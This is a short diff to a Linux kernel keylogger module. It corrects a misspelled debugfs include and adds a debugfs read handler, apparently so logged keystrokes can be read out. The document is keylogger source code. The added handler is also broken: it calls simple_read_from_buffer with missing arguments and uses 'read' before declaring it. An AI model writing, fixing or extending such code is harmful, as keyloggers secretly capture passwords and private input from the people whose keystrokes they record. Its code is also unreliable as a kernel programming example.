@@ -2,7 +2,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
-#incldue <linux/debugfs.h>
+#include <linux/debugfs.h>
 #include <linux/input.h>
 #include <linux/moduleparam.h>
 #include <asm/io.h>
@@ -52,7 +52,16 @@ static const char *keymap[][2] = {
 
 const struct file_operations fops = {
     .owner = THIS_MODULE,
+    .read  = read,
 };
+
+static ssize_t read(struct file *filp,
+		    char *buffer,
+		    size_t len,
+		    loff_t *offset)
+{
+    return simple_read_from_buffer(buffer, len, offset);
+}
 
 static struct notifier_block nb = {
     .notifier_call = cb,
@@ -73,5 +82,3 @@ static void keylogger_exit(void) {
 
 module_init(keylogger_init);
 module_exit(keylogger_exit);
-
-
